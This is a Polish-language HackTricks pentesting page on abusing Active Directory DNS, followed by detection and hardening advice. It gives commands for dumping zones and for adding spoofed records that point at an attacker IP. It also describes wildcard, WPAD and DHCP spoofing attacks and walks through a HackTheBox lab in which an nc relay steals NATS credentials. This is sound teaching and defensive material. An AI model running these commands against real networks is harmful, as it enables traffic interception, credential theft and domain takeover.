# Rekordy DNS AD

{{#include ../../banners/hacktricks-training.md}}

Domyślnie **dowolny użytkownik** w Active Directory może **wyliczyć wszystkie rekordy DNS** w strefach DNS domeny lub lasu, podobnie jak w przypadku zone transfer (użytkownicy mogą wyświetlać obiekty podrzędne strefy DNS w środowisku AD).

Narzędzie [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) umożliwia **wyliczanie** i **eksportowanie** **wszystkich rekordów DNS** w strefie na potrzeby rekonesansu sieci wewnętrznych.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (kwiecień 2025) dodaje wyjście w formacie JSON/Greppable (`--json`), wielowątkowe rozwiązywanie DNS oraz obsługę TLS 1.2/1.3 podczas łączenia z LDAPS  

Więcej informacji: [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Tworzenie / modyfikowanie rekordów (ADIDNS spoofing)

Ponieważ grupa **Authenticated Users** ma domyślnie uprawnienie **Create Child** na liście DACL strefy, każde konto domenowe (lub konto komputera) może zarejestrować dodatkowe rekordy. Można to wykorzystać do przechwytywania ruchu, wymuszania NTLM relay, a nawet przejęcia całej domeny.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py jest dołączony do Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Typowe prymitywy ataku

1. **Rekord wildcard** – `*.<zone>` zmienia serwer AD DNS w respondera działającego w całej firmie, podobnego do spoofingu LLMNR/NBNS. Można go wykorzystać do przechwytywania hashy NTLM lub przekazywania ich do LDAP/SMB. (Wymaga wyłączenia wyszukiwania WINS.)<sup>[[1]](#references)</sup>    
2. **Przejęcie WPAD** – dodaj `wpad` (lub rekord **NS** wskazujący hosta atakującego, aby ominąć Global-Query-Block-List) i transparentnie proxy’uj wychodzące żądania HTTP, aby przechwytywać dane uwierzytelniające. Microsoft załatał obejścia wildcard/DNAME (CVE-2018-8320), ale rekordy **NS** nadal działają.<sup>[[1]](#references)</sup>    
3. **Przejęcie nieaktualnego wpisu** – przejmij adres IP, który wcześniej należał do stacji roboczej; powiązany wpis DNS nadal będzie się rozwiązywał, umożliwiając ataki resource-based constrained delegation lub Shadow-Credentials bez jakiejkolwiek ingerencji w DNS.    
4. **Spoofing DHCP → DNS** – w domyślnym wdrożeniu Windows DHCP+DNS nieuwierzytelniony atakujący w tej samej podsieci może nadpisać dowolny istniejący rekord A (w tym rekordy kontrolerów domeny), wysyłając sfałszowane żądania DHCP, które wywołują dynamiczne aktualizacje DNS (Akamai „DDSpoof”, 2023). Daje to możliwość przeprowadzenia ataku machine-in-the-middle na Kerberos/LDAP i może doprowadzić do pełnego przejęcia domeny.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – zmień `dNSHostName` kontrolowanego przez siebie konta maszyny, zarejestruj pasujący rekord A, a następnie zażądaj certyfikatu dla tej nazwy, aby podszyć się pod DC. Narzędzia takie jak **Certipy** lub **BloodyAD** w pełni automatyzują ten proces.  

Rekord AD DNS z [serializowanymi informacjami o celu](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) może stanowić część łańcucha warunkowego relay: wywołujący musi mieć uprawnienia do tworzenia rekordów, istnieć musi ścieżka wymuszająca uwierzytelnienie komputera docelowego na tej nazwie oraz cel relay musi akceptować wynikowe uwierzytelnienie. Protokół docelowy należy ocenić osobno; podpisywanie SMB na połączeniu przychodzącym samo w sobie nie przesądza o tym, czy docelowa usługa HTTPS WinRM akceptuje relay. Poziom poprawek, obsługa nazw, Extended Protection i konfiguracja usługi mogą zmienić wynik.

---

### Przejęcie wewnętrznej usługi przez nieaktualne rekordy dynamiczne (studium przypadku NATS)

Gdy aktualizacje dynamiczne są dostępne dla wszystkich uwierzytelnionych użytkowników, **można ponownie zarejestrować wyrejestrowaną nazwę usługi i skierować ją do infrastruktury atakującego**. Kontroler domeny Mirage z HTB udostępniał nazwę hosta `nats-svc.mirage.htb` po scavengingu DNS, więc każdy użytkownik z niskimi uprawnieniami mógł:<sup>[[3]](#references)</sup>

1. **Potwierdzić, że brakuje rekordu** i poznać SOA za pomocą `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Odtwórz rekord, kierując go na zewnętrzny interfejs/VPN, nad którym mają kontrolę:**

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Podszyj się pod usługę plaintext**. Klienci NATS oczekują jednego banera `INFO { ... }` przed wysłaniem poświadczeń, więc skopiowanie prawidłowego banera z rzeczywistego brokera wystarczy, aby wyłudzić sekrety:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Każdy klient, który rozwiąże przejętą nazwę, natychmiast ujawni listenerowi swoją ramkę JSON `CONNECT` (w tym `"user"`/`"pass"`). Uruchomienie oficjalnego pliku binarnego `nats-server -V` na hoście atakującego, wyłączenie redakcji logów lub po prostu przechwycenie sesji w Wiresharku pozwala uzyskać te same poświadczenia w postaci jawnej, ponieważ TLS było opcjonalne.

4. **Pivot z przechwyconymi creds** – w Mirage skradzione konto NATS zapewniało dostęp do JetStream, co ujawniło historyczne zdarzenia uwierzytelniania zawierające możliwe do ponownego użycia nazwy użytkowników i hasła AD.

Ten schemat dotyczy każdej usługi zintegrowanej z AD, która opiera się na niezabezpieczonych uzgodnieniach TCP (API HTTP, RPC, MQTT itp.): po przejęciu rekordu DNS atakujący staje się usługą.

---

## Wykrywanie i wzmacnianie zabezpieczeń

* Odbierz **Authenticated Users** prawo *Create all child objects* w wrażliwych strefach i deleguj dynamiczne aktualizacje dedykowanemu kontu używanemu przez DHCP.
* Jeśli dynamiczne aktualizacje są wymagane, ustaw strefę na **Secure-only** i włącz **Name Protection** w DHCP, aby tylko obiekt komputera będący właścicielem mógł nadpisać własny rekord.
* Monitoruj zdarzenia DNS Server o identyfikatorach 257/252 (dynamiczna aktualizacja), 770 (transfer strefy) oraz zapisy LDAP do `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Blokuj niebezpieczne nazwy (`wpad`, `isatap`, `*`) za pomocą celowo nieszkodliwego rekordu lub Global Query Block List.
* Aktualizuj serwery DNS — błędy RCE CVE-2024-26224 i CVE-2024-26231 otrzymały ocenę **CVSS 9.8** i można je zdalnie wykorzystać przeciwko kontrolerom domeny.  

## References

- [1] [ADIDNS ponownie — WPAD, GQBL i więcej](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Spoofowanie rekordów DNS przez nadużycie dynamicznych aktualizacji DNS DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: łączenie NFS Leaks, nadużycia dynamicznego DNS, kradzieży poświadczeń NATS, sekretów JetStream i Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Wejście do strefy: zrzucanie DNS Active Directory za pomocą adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
